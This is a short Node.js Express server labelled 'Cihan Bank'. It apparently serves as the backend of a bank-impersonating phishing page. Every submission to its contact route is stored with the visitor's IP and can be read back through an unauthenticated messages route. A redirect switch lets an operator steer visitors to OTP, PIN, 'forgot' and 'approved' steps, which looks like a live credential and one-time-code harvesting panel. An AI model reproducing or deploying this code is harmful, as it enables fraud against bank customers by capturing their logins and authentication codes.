const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});

const DATA_FILE = path.join(__dirname, 'data.json');

function readData() {
  try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); }
  catch { return { messages: [], redirect: 'none' }; }
}

function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
}

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.post('/api/contact', (req, res) => {
  const data = readData();
  const msg = { ...req.body, time: Date.now(), ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress };
  data.messages.push(msg);
  writeData(data);
  res.json({ ok: true, redirect: data.redirect || 'none' });
});

app.get('/api/messages', (req, res) => {
  const data = readData();
  res.json(data.messages || []);
});

app.get('/api/redirect', (req, res) => {
  const data = readData();
  res.json({ redirect: data.redirect || 'none' });
});

app.post('/api/redirect', (req, res) => {
  const data = readData();
  const allowed = ['none', 'otp', 'pin', 'forgot', 'approved'];
  const target = allowed.includes(req.body.target) ? req.body.target : 'none';
  data.redirect = target;
  writeData(data);
  res.json({ ok: true, redirect: target });
});

app.use(express.static(path.join(__dirname, 'public'), {
  extensions: ['html']
}));

app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Cihan Bank server running on port ${PORT}`);
});
